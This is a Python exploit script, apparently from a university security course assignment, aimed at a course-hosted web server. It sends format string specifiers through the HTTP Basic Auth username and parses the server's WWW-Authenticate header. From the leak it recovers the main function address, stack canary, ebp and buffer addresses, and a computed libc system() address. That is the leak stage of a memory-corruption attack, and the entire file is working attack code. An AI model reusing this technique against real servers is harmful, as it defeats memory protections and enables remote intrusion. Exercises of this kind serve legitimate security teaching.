import requests
from requests.auth import HTTPBasicAuth


# Acquire all the required addresses based on the given indexes
def sniff_required_addresses(main_index, canary_index, ebp_index, system_index, url):

    max_index = max(main_index, canary_index, ebp_index, system_index)

    request_payload = max_index * '%p '
    auth = HTTPBasicAuth(request_payload, ' ')

    try:
        response_text = requests.get(url, auth=auth).headers['WWW-Authenticate'].split('=')[1]
    except:
        print(f'Timeout Occured For Index {max_index}')
        return -1
    
    addresses = response_text.split(" ")

    return addresses[main_index], addresses[canary_index], addresses[ebp_index], addresses[system_index]



# Get addresses using format string vulnerability (Task 1)
def sniff(url):

    # 117 --> main memory address
    # 28 --> canary protection value
    # 31 --> ebp index for content
    # 21 --> leaked address from string vulnerability close to system function so we can index it

    main_address_index = 117
    canary_value_index = 28
    ebp_index = 31
    address_for_system_index = 21

    # Storing addresses into dictionary
    addresses = dict()

    sniffed_addresses = sniff_required_addresses(main_index=main_address_index, canary_index=canary_value_index, ebp_index=ebp_index, system_index=address_for_system_index, url=url)

    if sniffed_addresses != -1:

        main_address, canary_value, ebp_content, address_for_system = sniffed_addresses

        # Main function address + index=0x7CB for post_param function address - index=0xC1 for send file function address
        send_file_address = hex(int(main_address, 16) + 0x7CB - 0xC1)

        # Start of buffer address has 0x78 distance from ebp content
        buffer_address = hex(int(ebp_content, 16) - 0x78) 
        
        addresses["main"] = main_address
        addresses["send_file"] = send_file_address
        addresses["canary"] = canary_value
        addresses["ebp"] = ebp_content
        addresses["buffer"] = buffer_address

        # Finding spesific address of a variable in stack (index 21) and then index it for system function
        addresses["system"] = hex(int(address_for_system, 16) - 0x3618B)

    else:

        print('Check Server Status')

    return addresses



# Prints addresses
def print_addresses(addresses):
    print(f'Address of main: {addresses["main"]}')
    print(f'Address of send_file: {addresses["send_file"]}')
    print(f'Canary Value: {addresses["canary"]}')
    print(f'$ebp content: {addresses["ebp"]}')
    print(f'Buffer Address: {addresses["buffer"]}')
    print(f'System Address: {addresses["system"]}')



if __name__ == "__main__":
    url = 'http://project-2.csec.chatzi.org:8000/'

    addresses = sniff(url=url)
    print_addresses(addresses)
